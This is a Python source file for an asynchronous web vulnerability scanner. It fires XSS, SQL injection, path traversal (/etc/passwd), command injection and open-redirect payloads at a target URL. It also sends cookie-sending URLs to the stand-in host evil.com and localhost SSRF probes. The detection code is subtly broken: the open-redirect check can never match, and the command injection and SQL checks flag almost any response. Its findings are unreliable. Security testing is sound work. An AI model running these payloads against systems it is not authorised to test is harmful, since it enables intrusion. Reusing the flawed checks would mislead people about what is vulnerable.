'''
       ^ Author    : Cisamu
       ^ Name      : AdvancedWebVulnScanner
       ^ Github    : https://github.com/cisamu123
'''
import aiohttp
import asyncio
import re
import json
from urllib.parse import urlparse
from rich.console import Console
from rich.progress import Progress, BarColumn
from utils import is_internal_ip

class AdvancedVulnScanner:
    def __init__(self, target_url, report_file, user_agent=None, proxies=None):
        self.target_url = target_url
        self.report_file = report_file
        self.user_agent = user_agent
        self.proxies = proxies
        self.internal_ips = [
            "127.0.0.1", "localhost", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"
        ]
        self.xss_payloads = [
            "<script>alert('XSS')</script>", "'\"><img src=x onerror=alert(1)>", "<svg/onload=alert('XSS')>"
        ]
        self.sql_payloads = [
            "' OR '1'='1", "' OR '1'='1' --", "' UNION SELECT NULL, NULL --"
        ]
        self.csrf_payloads = [
            "http://evil.com?cookie=", "<img src='http://evil.com/csrf?cookie="
        ]
        self.open_redirect_payloads = [
            "http://evil.com", "/redirect?url=http://evil.com"
        ]
        self.file_inclusion_payloads = [
            "../../../../etc/passwd", "../../../../../etc/passwd"
        ]
        self.command_injection_payloads = [
            "; ls", "| ls"
        ]
        self.test_payloads = [
            {'method': 'GET', 'payload': {'url': 'http://127.0.0.1'}},
            {'method': 'GET', 'payload': {'url': 'http://localhost'}},
            {'method': 'POST', 'payload': {'url': 'http://127.0.0.1'}},
            {'method': 'POST', 'payload': {'url': 'http://localhost'}}
        ]
        self.results = []
        self.console = Console()

    async def make_request(self, session, method, url, data=None, params=None):
        headers = {'User-Agent': self.user_agent} if self.user_agent else {}
        try:
            if method == 'GET':
                async with session.get(url, headers=headers, params=params, proxy=self.proxies, timeout=5) as response:
                    return await response.text()
            elif method == 'POST':
                async with session.post(url, headers=headers, data=data, proxy=self.proxies, timeout=5) as response:
                    return await response.text()
        except Exception as e:
            self.results.append(f"[ERROR] Request failed: {e}")
            return None

    async def test_xss(self, session, method, payload):
        for xss_payload in self.xss_payloads:
            try:
                params = {**payload, 'param': xss_payload} if method == 'GET' else None
                data = {**payload, 'param': xss_payload} if method == 'POST' else None
                body = await self.make_request(session, method, self.target_url, data=data, params=params)
                if body and xss_payload in body:
                    self.results.append(f"[VULNERABLE] XSS vulnerability found with {method} request! Payload: {xss_payload}")
            except Exception as e:
                self.results.append(f"[ERROR] XSS test failed: {e}")

    async def test_sql_injection(self, session, method, payload):
        for sql_payload in self.sql_payloads:
            try:
                params = {**payload, 'param': sql_payload} if method == 'GET' else None
                data = {**payload, 'param': sql_payload} if method == 'POST' else None
                body = await self.make_request(session, method, self.target_url, data=data, params=params)
                if body and re.search(r"error|syntax", body, re.IGNORECASE):
                    self.results.append(f"[VULNERABLE] SQL Injection vulnerability found with {method} request! Payload: {sql_payload}")
            except Exception as e:
                self.results.append(f"[ERROR] SQL Injection test failed: {e}")

    async def test_csrf(self, session, method, payload):
        for csrf_payload in self.csrf_payloads:
            try:
                params = {**payload, 'redirect': csrf_payload} if method == 'GET' else None
                data = {**payload, 'redirect': csrf_payload} if method == 'POST' else None
                body = await self.make_request(session, method, self.target_url, data=data, params=params)
                if body and re.search(r"redirect|csrf", body, re.IGNORECASE):
                    self.results.append(f"[VULNERABLE] CSRF vulnerability found with {method} request! Payload: {csrf_payload}")
            except Exception as e:
                self.results.append(f"[ERROR] CSRF test failed: {e}")

    async def test_open_redirect(self, session, method, payload):
        for redirect_payload in self.open_redirect_payloads:
            try:
                params = {**payload, 'redirect': redirect_payload} if method == 'GET' else None
                data = {**payload, 'redirect': redirect_payload} if method == 'POST' else None
                body = await self.make_request(session, method, self.target_url, data=data, params=params)
                if body and urlparse(self.target_url).netloc == urlparse(redirect_payload).netloc:
                    self.results.append(f"[VULNERABLE] Open Redirect vulnerability found with {method} request! Payload: {redirect_payload}")
            except Exception as e:
                self.results.append(f"[ERROR] Open Redirect test failed: {e}")

    async def test_file_inclusion(self, session, method, payload):
        for file_payload in self.file_inclusion_payloads:
            try:
                params = {**payload, 'file': file_payload} if method == 'GET' else None
                data = {**payload, 'file': file_payload} if method == 'POST' else None
                body = await self.make_request(session, method, self.target_url, data=data, params=params)
                if body and "passwd" in body:
                    self.results.append(f"[VULNERABLE] File Inclusion vulnerability found with {method} request! Payload: {file_payload}")
            except Exception as e:
                self.results.append(f"[ERROR] File Inclusion test failed: {e}")

    async def test_command_injection(self, session, method, payload):
        for cmd_payload in self.command_injection_payloads:
            try:
                params = {**payload, 'cmd': cmd_payload} if method == 'GET' else None
                data = {**payload, 'cmd': cmd_payload} if method == 'POST' else None
                body = await self.make_request(session, method, self.target_url, data=data, params=params)
                if body and re.search(r"ls", body, re.IGNORECASE):
                    self.results.append(f"[VULNERABLE] Command Injection vulnerability found with {method} request! Payload: {cmd_payload}")
            except Exception as e:
                self.results.append(f"[ERROR] Command Injection test failed: {e}")

    async def save_report(self):
        with open(self.report_file, 'w') as f:
            json.dump({"results": self.results}, f, indent=4)
        self.console.print(f"[bold green]Report saved to {self.report_file}[/bold green]")

    async def run(self):
        self.console.print(f"[bold cyan]Scanning {self.target_url} for vulnerabilities...[/bold cyan]")
        with Progress("[progress.description]{task.description}", BarColumn(), "[progress.percentage]{task.percentage:>3}%", transient=True) as progress:
            tasks = []
            for payload in self.test_payloads:
                for test_name, test_func in [
                    ("XSS", self.test_xss),
                    ("SQL Injection", self.test_sql_injection),
                    ("CSRF", self.test_csrf),
                    ("Open Redirect", self.test_open_redirect),
                    ("File Inclusion", self.test_file_inclusion),
                    ("Command Injection", self.test_command_injection)
                ]:
                    task = progress.add_task(f"[yellow]{test_name}[/yellow]", total=len(self.test_payloads))
                    tasks.append(self.perform_test(test_func, payload, task, progress))
            
            # Execute all tests
            await asyncio.gather(*tasks)

        await self.save_report()
        self.console.print(f"[bold green]Scanning complete![/bold green]")

    async def perform_test(self, test_func, payload, task, progress):
        async with aiohttp.ClientSession() as session:
            await test_func(session, payload['method'], payload)
            progress.update(task, advance=1)
